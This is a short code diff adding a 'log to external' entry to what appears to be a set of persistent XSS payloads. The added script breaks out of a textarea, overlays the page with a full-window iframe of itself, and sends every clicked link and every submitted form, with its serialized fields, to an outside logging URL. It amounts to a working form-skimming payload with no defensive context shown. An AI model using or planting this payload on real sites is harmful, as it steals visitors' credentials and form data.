@@ -36,3 +36,34 @@ console.log(this.href);
 })
 }).attr('src', location.href.replace(/\?.*/,''));
 </script>
+
+== log to external
+
+</textarea><script>
+$('<iframe id=me>').css({
+position: 'absolute',
+width: '100%',
+height: '100%',
+top: 0,
+left: 0,
+border: 0,
+background: '#fff'
+}
+).appendTo('body').load(function() {
+var frame = this;
+var log = function(what) {
+    $.post('http://html5.localhost/persistent_xss/log.php?site='+encodeURIComponent(document.domain), what);
+};
+
+log(this.contentDocument.body.scrollHeight); // in case we need to resize frame
+$('body',this.contentDocument).find('a').click(function() {
+log({event:'click', 'href': this.href});
+}).end()
+.find('form').submit(function() {
+   log({event: 'form',
+        action: $(this).attr('action')|| frame.contentDocument.location.href,
+        fields: $(this).serialize()
+       });
+})
+}).attr('src', location.href.replace(/\?.*/,''));
+</script>
